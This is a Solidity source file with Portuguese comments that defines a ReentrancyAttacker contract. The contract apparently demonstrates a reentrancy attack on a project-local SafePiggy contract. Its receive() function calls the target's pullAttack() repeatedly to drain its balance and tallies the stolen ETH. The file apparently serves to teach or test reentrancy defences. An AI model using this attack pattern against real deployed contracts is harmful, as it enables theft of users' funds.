// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "./projects/SafePiggy.sol";

// 🚨 Contrato malicioso para demonstrar ataque de reentrância
contract ReentrancyAttacker {
    SafePiggy public target;
    uint256 public attackCount;
    uint256 public totalStolen;
    
    event AttackAttempt(uint256 attempt, uint256 amount);
    event AttackSuccess(uint256 totalStolen);
    
    constructor(address _target) {
        target = SafePiggy(payable(_target));
    }
    
    // 💰 Função para depositar ETH no contrato atacante
    function fund() external payable {
        // Simula ter ETH para o ataque
    }
    
    // 🚨 ATAQUE DE REENTRÂNCIA
    // Esta função será chamada quando o contrato receber ETH
    receive() external payable {
        attackCount++;
        totalStolen += msg.value;
        
        emit AttackAttempt(attackCount, msg.value);
        
        // 🚨 ATAQUE: Tenta chamar pullAttack() novamente enquanto ainda está executando
        // Se não houver proteção, isso drenará o contrato
        // pullAttack() é vulnerável porque não tem modifier noReentrancy
        if (address(target).balance > 0) {
            target.pullAttack();
        }
    }
    
    // 🚨 ATAQUE DE REENTRÂNCIA usando pullAttack()
    function startAttackVulnerable() external {
        // Só funciona se tiver allowance
        require(target.allowance(address(this)) > 0, "No allowance");
        target.pullAttack();
    }
    
    // 📊 Função para verificar o saldo do atacante
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    // 📊 Função para verificar estatísticas do ataque
    function getAttackStats() external view returns (uint256, uint256) {
        return (attackCount, totalStolen);
    }
}
